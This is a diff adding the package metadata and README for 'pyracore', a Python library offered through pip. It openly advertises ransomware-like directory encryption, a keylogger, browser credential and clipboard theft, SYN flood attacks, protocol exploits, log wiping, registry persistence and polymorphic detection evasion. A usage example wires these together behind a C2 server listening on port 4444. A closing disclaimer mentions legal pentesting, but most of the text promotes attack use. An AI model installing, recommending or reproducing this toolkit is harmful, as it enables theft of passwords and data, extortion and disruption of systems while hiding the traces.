@@ -1,0 +1,161 @@
+Metadata-Version: 2.2
+Name: pyracore
+Version: 2.0.2
+Summary: Uma biblioteca modular para operações avançadas em sistemas.
+Home-page: https://github.com/joaquimtimoteo/pyracore
+Author: Joaquim Carlos Timóteo
+Author-email: joaquimcarlostimoteo1@gmail.com
+Classifier: Programming Language :: Python :: 3
+Classifier: License :: OSI Approved :: MIT License
+Classifier: Operating System :: OS Independent
+Requires-Python: >=3.6
+Description-Content-Type: text/markdown
+Requires-Dist: cryptography
+Requires-Dist: pynput
+Requires-Dist: requests
+Requires-Dist: scapy
+Requires-Dist: psutil
+Dynamic: author
+Dynamic: author-email
+Dynamic: classifier
+Dynamic: description
+Dynamic: description-content-type
+Dynamic: home-page
+Dynamic: requires-dist
+Dynamic: requires-python
+Dynamic: summary
+
+### **README.md for PyraCore**
+
+---
+
+# PyraCore
+
+## Introduction
+**PyraCore** is a highly modular and robust Python library designed to facilitate the development of advanced tools for system, network, and security operations. Its power lies in its comprehensive set of features that enable sophisticated tasks with ease and efficiency.
+
+## Key Features
+
+### 1. Advanced Encryption
+- **AES Encryption/Decryption**: PyraCore provides secure AES encryption and decryption functions, ensuring data protection during transmission.
+- **File/Directory Operations**: The library can encrypt and decrypt entire directories, making it useful for protecting sensitive files or implementing ransomware-like functionality.
+
+### 2. Keylogger Functionality
+- Monitors keystrokes in real-time and logs them to hidden files, allowing for the capture of sensitive information like passwords and credit card numbers.
+
+### 3. Exploitation Capabilities
+- Includes modules for exploiting vulnerabilities in protocols such as RDP, SMB, and HTTP, enabling penetration testing or malicious activities depending on the user's intent.
+
+### 4. Information Gathering
+- Extracts browser credentials, captures clipboard content, and steals system information (OS details, IP addresses, etc.), providing valuable insights into the target system.
+
+### 5. Network Scanning and Attacks
+- Performs SYN Flood attacks and scans networks for active hosts, facilitating network reconnaissance and potential denial-of-service attacks.
+
+### 6. Anti-Forensics Techniques
+- Deletes logs from the system to hinder forensic analysis, making it difficult to trace the actions performed by the library.
+
+### 7. Persistence Mechanisms
+- Adds the script to the Windows registry or startup folder to ensure it runs automatically upon system reboot, maintaining long-term access to the target system.
+
+### 8. Polymorphic Code
+- Generates dynamic code variations to evade detection by static analysis tools, increasing the stealthiness of the library's operations.
+
+---
+
+## Installation
+
+To install the **PyraCore** library, you can use `pip`:
+
+```bash
+pip install pyracore
+```
+
+---
+
+## Usage
+
+### Basic Example
+Here's a basic example of how to use the library:
+
+```python
+from pyracore.core.server import Server
+from pyracore.modules.keylogger import Keylogger
+from pyracore.modules.network import syn_flood, stop_syn_flood
+from pyracore.modules.credentials import extract_browser_passwords
+from pyracore.modules.file_operations import encrypt_directory, decrypt_directory
+from pyracore.modules.system_info import steal_system_info
+from pyracore.modules.clipboard import capture_clipboard
+from pyracore.modules.anti_forensics import anti_forensics
+from pyracore.sandbox_detection import is_sandbox
+
+# Initialize the server C2
+server = Server('192.168.1.102', 4444)  # Change to your Kali Linux IP
+server.accept_connections()
+
+# Start the keylogger
+keylogger = Keylogger()
+keylogger.start()
+
+# Execute an SYN flood attack
+syn_flood("192.168.1.10", 80)
+
+# Stop the SYN flood attack
+stop_syn_flood()
+
+# Extract browser credentials
+creds = extract_browser_passwords()
+print(creds)
+
+# Encrypt a directory
+encrypt_directory("/path/to/directory")
+
+# Decrypt a directory
+decrypt_directory("/path/to/directory")
+
+# Capture clipboard content
+clipboard_content = capture_clipboard()
+print(clipboard_content)
+
+# Steal system information
+info = steal_system_info()
+print(info)
+
+# Perform anti-forensics actions
+anti_forensics()
+
+# Check if running in a sandbox environment
+if is_sandbox():
+    print("Sandbox detected.")
+    # self_destruct()
+```
+
+---
+
+## Contribution
+
+Contributions are welcome! If you want to improve or add new functionalities to **PyraCore**, follow these steps:
+
+1. Fork the repository.
+2. Create a branch for your contribution (`git checkout -b feature/nome-da-feature`).
+3. Make your changes and commit (`git commit -am 'Adiciona nova funcionalidade'`).
+4. Push to the branch (`git push origin feature/nome-da-feature`).
+5. Open a Pull Request on GitHub.
+
+---
+
+## License
+
+This project is licensed under the [MIT License](LICENSE). This means you can use, modify, and distribute it freely, provided you maintain the original credits.
+
+---
+
+## Contact
+
+If you have any questions or need help, feel free to contact us at joaquimcarlostimoteo1@gmail.com.
+
+---
+
+## Disclaimer
+
+While **PyraCore** offers powerful functionalities for legitimate purposes like penetration testing and security research, its misuse can lead to severe consequences, both legally and ethically. It is essential to use this library responsibly and within the bounds of the law, adhering to ethical guidelines and obtaining proper authorization before conducting any operations. Always prioritize ethical considerations and legal compliance when utilizing advanced libraries like PyraCore.
